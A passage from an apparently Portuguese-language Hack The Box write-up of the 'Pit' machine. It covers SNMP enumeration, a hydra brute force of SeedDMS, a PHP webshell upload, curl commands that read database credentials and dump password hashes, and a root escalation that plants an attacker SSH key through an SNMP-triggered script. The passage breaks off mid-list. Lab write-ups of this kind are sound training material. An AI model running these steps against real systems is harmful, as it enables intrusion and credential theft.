SF:<span class="o">}</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20p<span class="se">\x</span>20<span class="o">{</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20
SF:<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20margin:<span class="se">\x</span>200<span class="se">\x</span>200<span class="se">\x</span>2010p<span class="s2">");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 213.97 seconds
</span></code></pre></div></div>

<p>Com base no resultado do scan, notado que existe um DNS <code class="language-plaintext highlighter-rouge">dms-pit.htb</code> configurado em um certificado SSL, que foi configurado no arquivo hosts local.</p>

<h3 id="80tcp-e-9090tcp---serviços-http">80/TCP e 9090/TCP - Serviços HTTP</h3>

<p>Acessando as páginas, podemos ver na URI <code class="language-plaintext highlighter-rouge">http://10.10.10.241:80</code> a página padrão do <code class="language-plaintext highlighter-rouge">nginx</code> enquanto para <code class="language-plaintext highlighter-rouge">https://10.10.10.241:9090</code> vemos a página de login do <a href="https://cockpit-project.org/">Cockpit Project — Cockpit Project (cockpit-project.org)</a>.</p>

<p><img src="https://i.imgur.com/ldyoAq7.png" alt="HTB Pit - Cockpit login page" class="align-center" /></p>

<p>Cockpit é uma interface web para administração Linux e, como o nome da máquina é parte do nome da solução, devo estar no caminho correto :smile:.  O domínio <code class="language-plaintext highlighter-rouge">pit.htb</code> é mencionado como nome da máquina, também incluído no arquivo hosts local.</p>

<p>Buscando por vulnerabilidades para este produto, encontrei uma vulnerabilidade para SSRF na versão 234 a partir de uma pesquina no  <code class="language-plaintext highlighter-rouge">searchsploit</code>, que poderia de alguma forma ser útil uma vez que não depende de nenhuma credencial.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit cockpit
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
 Exploit Title                                                        |  Path
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
Cockpit CMS 0.4.4 &lt; 0.5.5 - Server-Side Request Forgery               | php/webapps/44567.txt
Cockpit CMS 0.6.1 - Remote Code Execution                             | php/webapps/49390.txt
Cockpit Version 234 - Server-Side Request Forgery <span class="o">(</span>Unauthenticated<span class="o">)</span>   | multiple/webapps/49397.txt
openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery                    | php/webapps/47305.py
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
Shellcodes: No Results

<span class="nv">$ </span><span class="nb">head</span> <span class="si">$(</span>locate  multiple/webapps/49397.txt<span class="si">)</span>
<span class="c"># Exploit Title: Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)</span>
<span class="c"># Date: 08.01.2021</span>
<span class="c"># Exploit Author: Metin Yunus Kandemir</span>
<span class="c"># Vendor Homepage: https://cockpit-project.org/</span>
<span class="c"># Version: v234</span>
<span class="c"># Tested on: Ubuntu 18.04</span>

<span class="c">#!/usr/bin/python3</span>
import argparse
import requests
</code></pre></div></div>

<p>Lendo a respeito da vulnerabilidade <a href="https://github.com/passtheticket/vulnerability-research/blob/main/cockpitProject/README.md">nesta página do Github</a> podemos ver que ela pode ser utilizada para enumerar e acessar conteúdo que normalmente não teriamos acesso a partir de nosso host ou das portas de comunicação disponíveis, podendo ser útil em um segundo momento mas que agora não ajudará muito.</p>

<p>Avançando com a enumeração agora utilizando o <code class="language-plaintext highlighter-rouge">whatweb</code>, para agilizar um pouco as coisas criei um script bash simples que faz um loop nos dominios encontrados e endereço IP e portas de modo a buscar alguma diferneça nas publicações e o que temos em cada combinação</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">declare</span> <span class="nt">-a</span> <span class="nv">hosts</span><span class="o">=(</span><span class="s2">"10.10.10.241"</span> <span class="s2">"pit.htb"</span> <span class="s2">"dms-pit.htb"</span><span class="o">)</span><span class="p">;</span>
<span class="nb">declare</span> <span class="nt">-a</span> <span class="nv">ports</span><span class="o">=(</span><span class="s2">"80"</span> <span class="s2">"9090"</span><span class="o">)</span><span class="p">;</span>

<span class="k">for </span>host <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">hosts</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
        for </span>port <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">ports</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
                </span>whatweb <span class="nt">--color</span><span class="o">=</span>never <span class="nt">-a</span> 3 <span class="s2">"</span><span class="nv">$host</span><span class="s2">:</span><span class="nv">$port</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> whatweb_enum.txt
        <span class="k">done
done</span>
</code></pre></div></div>

<p>Avaliando os resultados, encontrei algo interessante: quando acessamos o domínio <code class="language-plaintext highlighter-rouge">dms-pit.htb</code> recebemos um erro  <strong>403 Forbidden</strong>, cenário ideal para usar a vulnerabilidade de SSRF no Cockpit, se presente :smile:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://dms-pit.htb/ [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], Title[403 Forbidden], nginx[1.14.1]
</code></pre></div></div>

<p>Após alguns testes com a PoC encontrada, notei que a opção “Connect to” mencionada nas notas encontradas não estava presente. Também, inspecionando os videos, notei que a versão que utilizamos foi atualizada e não mais vulneravel, o que também foi confirmado realizando alguns acessos em <code class="language-plaintext highlighter-rouge">/cockpit</code> sem sucesso :disappointed:.</p>

<p>Reiniciei o processo de enumeração, executando o <code class="language-plaintext highlighter-rouge">nmap</code> em todas as portas TCP e também executando um scan rápido UDP, buscando por algo que tenha deixado para trás na fase inicial. Também iniciei uma enumeração de diretórios com o <code class="language-plaintext highlighter-rouge">gobuster</code> diretamente no endereço IP ( <code class="language-plaintext highlighter-rouge">http://10.10.10.241</code>) para buscar algum website neste servidor publicado.</p>

<p>Após alguma espera, infelizmente o scan de diretórios com <code class="language-plaintext highlighter-rouge">gobuster</code> e o scan de todas as portas TCP com <code class="language-plaintext highlighter-rouge">nmap</code> não apresentaram resultado algum. Surpreendentemente o scan UDP retornou duas portas, conforme abaixo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">-sV</span> <span class="nt">-vv</span> <span class="nt">-oA</span> quick_udp 10.10.10.241
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-10 13:53 <span class="nt">-03</span>
NSE: Loaded 45 scripts <span class="k">for </span>scanning.
Initiating Ping Scan at 13:53
Scanning 10.10.10.241 <span class="o">[</span>4 ports]
Completed Ping Scan at 13:53, 0.10s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating UDP Scan at 13:53
Increasing send delay <span class="k">for </span>10.10.10.241 from 800 to 1000 due to 37 out of 121 dropped probes since last increase.
Warning: 10.10.10.241 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>dms-pit.htb <span class="o">(</span>10.10.10.241<span class="o">)</span>
Host is up, received echo-reply ttl 63 <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2021-08-10 13:53:34 <span class="nt">-03</span> <span class="k">for </span>1081s
Not shown: 998 filtered ports
Reason: 979 admin-prohibiteds and 19 host-unreaches
PORT      STATE         SERVICE REASON       VERSION
161/udp   open          snmp    udp-response SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
20762/udp open|filtered unknown no-response
Service Info: Host: pit.htb

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
</code></pre></div></div>

<h3 id="161udp---snmp-service">161/UDP - SNMP Service</h3>

<p>Dos resultados encontrados, iniciado com o SNMP, onde executei o comando <code class="language-plaintext highlighter-rouge">snmp-check</code> e pude obter informações básicas do sistema porém nenhum segredo ou dado sensível foi exibido.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmp-check 10.10.10.241
</code></pre></div></div>

<p>Usando outra ferramenta, o <code class="language-plaintext highlighter-rouge">snmpwalk</code> como recomendado <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp#from-snmp-to-rce">nesta página</a>, notei que a ferramenta pode enumerar OIDs (Object Identifiers) específicos mas, com os dados que temos, nenhuma informação relevante estava sendo listada mas nos permitiu listar as contas presentes no sistema, além de outras informações já anteriormente listadas.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Memory usage
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       345Mi       3.1Gi       8.0Mi       452Mi       3.2Gi
Swap:         1.9Gi          0B       1.9Gi
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 13:33:08 up 37 min,  0 users,  load average: 0.19, 0.10, 0.18
</code></pre></div></div>

<p>Buscando conhecer mais como enumerar serviços SNMP, encontrei a página <a href="https://lrodrigo.sgs.lncc.br/wp/dicas/smnpcomandos-disponiveis-no-linux/snmpcomandos-snmpwalk/">SNMP:Comandos – snmpwalk – LRodrigo – Web Site (lncc.br)</a> que fala sobre alguns comandos úteis enquanto utilizamos o <code class="language-plaintext highlighter-rouge">snmpwalk</code>. O fato interessante é que, se você especificar o OID até um certo ponto, a ferramenta lista toda informação abaixo daquele nó, uma vez que o SNMP funciona em uma estrutura de árvore conforme imagem abaixo, extraída de Wikimedia.org:</p>

<p><img src="https://i.imgur.com/Gb2LBgj.png" alt="HTB Pit - SNMP Tree - source: wikimedia.org" /></p>

<p>Uma vez que o root (em vermelho na imagme) nunca muda, decidi executar o <code class="language-plaintext highlighter-rouge">snmpwalk</code> mais uma vez mas especificando diretamente o ponto onde gostaria de inspecionar, que é <strong>logo a partir do root</strong> (.1) e filtrei os valores em ranco, utilizando o comando abaixo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmpwalk <span class="nt">-v</span> 1 <span class="nt">-c</span> public 10.10.10.241  .1 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\"\"</span><span class="s2">$"</span>
</code></pre></div></div>

<p>As coisas começaram a ficar interessantes onde, logo após a lista dos processos, um OID <strong>.1.3.6.1.4.1.2021</strong> exibia informações sobre configuração do nginx, antes não mostrado nos comandos executados anteriormente, e que em uma as linhas mencionava o caminho <code class="language-plaintext highlighter-rouge">/var/www/html/seeddms51x/seeddms</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iso.3.6.1.4.1.2021.2.1.1.1 = INTEGER: 1
iso.3.6.1.4.1.2021.2.1.2.1 = STRING: "nginx"
iso.3.6.1.4.1.2021.2.1.3.1 = INTEGER: 1
iso.3.6.1.4.1.2021.2.1.4.1 = INTEGER: 0
iso.3.6.1.4.1.2021.2.1.5.1 = INTEGER: 3
iso.3.6.1.4.1.2021.2.1.100.1 = INTEGER: 0
iso.3.6.1.4.1.2021.2.1.102.1 = INTEGER: 0
iso.3.6.1.4.1.2021.9.1.1.1 = INTEGER: 1
iso.3.6.1.4.1.2021.9.1.1.2 = INTEGER: 2
iso.3.6.1.4.1.2021.9.1.2.1 = STRING: "/"
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
iso.3.6.1.4.1.2021.9.1.3.1 = STRING: "/dev/mapper/cl-root"
iso.3.6.1.4.1.2021.9.1.3.2 = STRING: "/dev/mapper/cl-seeddms"
iso.3.6.1.4.1.2021.9.1.4.1 = INTEGER: 10000
iso.3.6.1.4.1.2021.9.1.4.2 = INTEGER: 100000
iso.3.6.1.4.1.2021.9.1.5.1 = INTEGER: -1
iso.3.6.1.4.1.2021.9.1.5.2 = INTEGER: -1
iso.3.6.1.4.1.2021.9.1.6.1 = INTEGER: 2611200
iso.3.6.1.4.1.2021.9.1.6.2 = INTEGER: 125600
iso.3.6.1.4.1.2021.9.1.7.1 = INTEGER: 374736
</code></pre></div></div>

<p>Retornei para o browser e tentei algumas combinações de dominios com o caminho virtual provável, onde obtive acesso ao  endereço <code class="language-plaintext highlighter-rouge">http://dms-pit.htb/seeddms51x/seeddms</code> onde o portal do <strong>SeedDMS</strong> se encontrava disponível.</p>

<p><img src="https://i.imgur.com/PsX5dm0.png" alt="HTB Pit - SeedDMS" class="align-center" /></p>

<h2 id="acesso-inicial">Acesso inicial</h2>

<p>Dando uma rápida busca no <code class="language-plaintext highlighter-rouge">searchsploit</code> encontrei alguns exploits para este app, porém todos estes dependiam de uma conta para funcionamento.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit seeddms
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
 Exploit Title                                                        |  Path
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
Seeddms 5.1.10 - Remote Command Execution <span class="o">(</span>RCE<span class="o">)</span> <span class="o">(</span>Authenticated<span class="o">)</span>       | php/webapps/50062.py
SeedDMS 5.1.18 - Persistent Cross-Site Scripting                      | php/webapps/48324.txt
SeedDMS &lt; 5.1.11 - <span class="s1">'out.GroupMgr.php'</span> Cross-Site Scripting            | php/webapps/47024.txt
SeedDMS &lt; 5.1.11 - <span class="s1">'out.UsrMgr.php'</span> Cross-Site Scripting              | php/webapps/47023.txt
SeedDMS versions &lt; 5.1.11 - Remote Command Execution                  | php/webapps/47022.txt
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
Shellcodes: No Results
</code></pre></div></div>

<p>Já que temos os nomes dos usuários e metade da resposta é o nome de usuário, obtidos a partir da execução usando <code class="language-plaintext highlighter-rouge">snmpwalk</code> em que <strong>michelle</strong> foi encontrado, podemos tentar adivinhá-los ou realizar um brute force com o <code class="language-plaintext highlighter-rouge">hydra</code>, método escolhido e que retornou a senha igual ao nome de usuário:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hydra <span class="nt">-l</span> michelle <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt dms-pit.htb http-post-form <span class="s2">"/seeddms51x/seeddms/op/op.Login.php:login=^USER^&amp;pwd=^PASS^&amp;lang=:Error"</span> <span class="nt">-t</span> 10
Hydra v9.1 <span class="o">(</span>c<span class="o">)</span> 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>

Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-08-10 16:05:20
<span class="o">[</span>DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~1434440 tries per task
<span class="o">[</span>DATA] attacking http-post-form://dms-pit.htb:80/seeddms51x/seeddms/op/op.Login.php:login<span class="o">=</span>^USER^&amp;pwd<span class="o">=</span>^PASS^&amp;lang<span class="o">=</span>:Error
<span class="o">[</span>80][http-post-form] host: dms-pit.htb   login: michelle   password: michelle
1 of 1 target successfully completed, 1 valid password found
Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-08-10 16:05:24
</code></pre></div></div>

<p>Já que temos agora uma credencial para o SeedDMS, podemos explorar a vulnerabilidade, que nos permitiu, logo após o upload de um documento php ( neste caso contendo um webshell - <code class="language-plaintext highlighter-rouge">&lt;?php system($_GET["cmd"]); ?&gt;</code>), obter execução remota de código a partir de chamadas utilizando <code class="language-plaintext highlighter-rouge">curl</code> com base no document ID identificado após o upload, neste caso <strong>31</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/31/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=id'</span>
<span class="nv">uid</span><span class="o">=</span>992<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<p>Mesmo tendo execução remota de código na máquina, todas as tentativas de shell reverso falharam. Tentei vários métodos (bash, python, payload externo, etc) e nenhum deles funcionou, possivelmente devido ao <strong>SELinux ativo na máquina</strong>. Com base nisso, decidi enumerar a máquina a partir deste canal.</p>

<p>Validando o <a href="https://github.com/JustLikeIcarus/SeedDMS/blob/master/conf/settings.xml.template">repositório do SeedDMS no GitHub</a>, identifiquei que existe um arquivo <code class="language-plaintext highlighter-rouge">/conf/settings.xml</code> que contém as credenciais para o banco de dados, que poderiam ser reutilizadas por outros usuários no sistema.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/33/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=cat /var/www/html/seeddms51x/conf/settings.xml'</span> | <span class="nb">grep </span>database
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11933    0 11933    0     0  77993      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 77993
    &lt;edition <span class="nv">strictFormCheck</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">viewOnlineFileTypes</span><span class="o">=</span><span class="s2">".txt;.text;.html;.htm;.xml;.pdf;.gif;.png;.jpg;.jpeg"</span> <span class="nv">enableConverting</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">enableEmail</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">enableUsersView</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">enableFullSearch</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">enableClipboard</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableFolderTree</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">expandFolderTree</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">enableLanguageSelector</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">stopWordsFile</span><span class="o">=</span><span class="s2">""</span> <span class="nv">sortUsersInList</span><span class="o">=</span><span class="s2">""</span> <span class="nv">enableDropUpload</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableRecursiveCount</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">maxRecursiveCount</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">enableThemeSelector</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">fullSearchEngine</span><span class="o">=</span><span class="s2">"sqlitefts"</span> <span class="nv">sortFoldersDefault</span><span class="o">=</span><span class="s2">"u"</span> <span class="nv">editOnlineFileTypes</span><span class="o">=</span><span class="s2">""</span> <span class="nv">enableMenuTasks</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableHelp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">defaultSearchMethod</span><span class="o">=</span><span class="s2">"database"</span> <span class="nv">libraryFolder</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">maxSizeForFullText</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">showSingleSearchHit</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableSessionList</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableDropFolderList</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableMultiUpload</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">defaultDocPosition</span><span class="o">=</span><span class="s2">"end"</span><span class="o">&gt;</span>
       - restricted: Restricted access: only allow <span class="nb">users </span>to log <span class="k">in if </span>they have an entry <span class="k">in </span>the <span class="nb">local </span>database <span class="o">(</span>irrespective of successful authentication with LDAP<span class="o">)</span><span class="nb">.</span>
       - dbDatabase: database where the tables <span class="k">for </span>seeddms are stored <span class="o">(</span>optional - see adodb-readme<span class="o">)</span>
       - dbUser: username <span class="k">for </span>database-access
       - dbPass: password <span class="k">for </span>database-access
    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">"mysql"</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">"localhost"</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">"seeddms"</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">"seeddms"</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">"ied^ieY6xoquu"</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">"false"</span><span class="o">&gt;</span>
    &lt;/database&gt;
</code></pre></div></div>

<p>Utilizando o <code class="language-plaintext highlighter-rouge">mysql</code> via linha de comando, enumerei tabelas, colunas e, por fim, usuários e hashes de senhas utilizando as credenciais obtidas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># List Tables</span>
<span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/30/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=mysql -u seeddms --password=ied^ieY6xoquu -e "use seeddms; select login,pwd,role from tblUsers; exit"'</span>
<span class="o">[</span>...]

<span class="c"># List Columns from tblUsers</span>
<span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/34/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=mysql -u seeddms --password=ied^ieY6xoquu -e "use seeddms; show columns from tblUsers; exit"'</span>
<span class="o">[</span>...]

<span class="c"># Dump credentials</span>
<span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/30/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=mysql -u seeddms --password=ied^ieY6xoquu -e "use seeddms; select login,pwd,role from tblUsers; exit"'</span>
login   <span class="nb">pwd     </span>role
admin   155dd275b4cb74bd1f80754b61148863        1
guest   NULL    2
michelle        2345f10bb948c5665ef91f6773b3e455        0
jack    682d305fdaabc156430c4c6f6f5cc65d        0
</code></pre></div></div>

<p>Com estes hashes, tentei quebrá-los utilizando <code class="language-plaintext highlighter-rouge">john</code> e o dicionário <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, porém sem sucesso.</p>

<p>Como temos as credenciais de banco de dados, lembrei que poderiamos utilizá-las para acessar a console interativa via Cockpit, onde as credenciais do usuário <code class="language-plaintext highlighter-rouge">seeddms</code> falharam mas funcionou com sucesso para a usuária <code class="language-plaintext highlighter-rouge">michelle</code>.</p>

<p>Acessando o terminal via portal web, fui capaz de acessar o conteúdo do arquivo <code class="language-plaintext highlighter-rouge">user.txt</code> e obter a flag</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>michelle@pit ~]<span class="nv">$ </span><span class="nb">ls 
</span>check.sh  user.txt
<span class="o">[</span>michelle@pit ~]<span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>Após submeter a flag, fui incapaz de executar <code class="language-plaintext highlighter-rouge">sudo -l</code> como executado de costume, logo iniciei a enumeração a partir da conta da usuária <code class="language-plaintext highlighter-rouge">michelle</code> utilizando o <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, onde nada de muito interessante foi listado além de um privilégio não usual num arquivo também não padrão do Linux:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
# file: /usr/local/monitoring
USER   root      rwx
user   michelle  -wx
GROUP  root      rwx
mask             rwx
other            ---                  
</code></pre></div></div>

<p>Inspecionando este arquivo, na verdade descobri que se tratava de um diretório, o qual não temos acesso de leitura (apenas escrita e execução vide output acima). Buscando por outros arquivos que fizessem referência a este diretório, executei um <code class="language-plaintext highlighter-rouge">grep</code> recursivo no sistema, onde encontrei um arquivo previamente observado no scan do <code class="language-plaintext highlighter-rouge">snmpwalk</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>michelle@pit <span class="nb">local</span><span class="o">]</span><span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"/usr/local/monitoring/"</span>  / 2&gt;/dev/null
/usr/bin/monitor:for script <span class="k">in</span> /usr/local/monitoring/check<span class="k">*</span>sh
<span class="o">[</span>michelle@pit <span class="nb">local</span><span class="o">]</span><span class="nv">$ </span><span class="nb">cat</span> /usr/bin/monitor 
<span class="c">#!/bin/bash</span>

<span class="k">for </span>script <span class="k">in</span> /usr/local/monitoring/check<span class="k">*</span>sh
<span class="k">do</span>
    /bin/bash <span class="nv">$script</span>
<span class="k">done</span>
<span class="o">[</span>michelle@pit <span class="nb">local</span><span class="o">]</span><span class="err">$</span>
</code></pre></div></div>

<p>Como podemos ver, este script executa quaisquer arquivos com nome <code class="language-plaintext highlighter-rouge">check*.sh</code> do diretório <code class="language-plaintext highlighter-rouge">/usr/local/monitoring</code>, permitindo, que qualquer comando arbitrário seja executado a partir do processo que inicializa o script <code class="language-plaintext highlighter-rouge">/usr/bin/monitor</code>.</p>

<p>Para melhor entendimento de como poderia usar este privilégio encontrado, decidi buscar dentro do recon já realizado menções ao arquivo <code class="language-plaintext highlighter-rouge">monitor</code>, onde encontrei uma referência nos scans do SNMP onde este arquivo se encontra configurado como <strong>nsExtendedCommands</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"/usr/bin/monitor"</span> <span class="nb">.</span>
./scans/snmpwalk_nsExtendObjects.txt:NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="s2">"monitoring"</span> <span class="o">=</span> STRING: /usr/bin/monitor
./scans/snmp_full.txt:iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 <span class="o">=</span> STRING: <span class="s2">"/usr/bin/monitor"</span>
</code></pre></div></div>

<p>De acordo com o guia em <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce#getting-the-shell-from-net-snmp-extend">SNMP RCE - HackTricks</a>, se algum componente estiver configurado como nsExtendedCommand (ou for capaz de adicionar algum binário arbitrariamente dentre estas configurações), você pode inicializar a sua execução utilizando o <code class="language-plaintext highlighter-rouge">snmpwalk</code>.</p>

<p>Com base nas informações levantadas, temos uma possível forma de obter acesso <code class="language-plaintext highlighter-rouge">root</code>, onde os seguintes passos foram utilizados:</p>

<ul>
  <li>Criei um arquivo  <code class="language-plaintext highlighter-rouge">checkXXXX.sh</code>, que adiciona uma chave pública como confiável dentro do arquivo <code class="language-plaintext highlighter-rouge">authorized_keys</code> do perfil que executa o processo e copiado para <code class="language-plaintext highlighter-rouge">/usr/bin/monitor</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">echo</span> <span class="s2">"ssh-rsa &lt;base64PubKey&gt; root@kali"</span> <span class="o">&gt;&gt;</span> ~/.ssh/authorized_keys
</code></pre></div></div>

<ul>
  <li>A partir da máquina do atacante, iniciei a ação para executar as ações nsExtendedObject</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Trigger Extended objects</span>
snmpwalk <span class="nt">-v</span> 1 <span class="nt">-c</span> public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
</code></pre></div></div>

<ul>
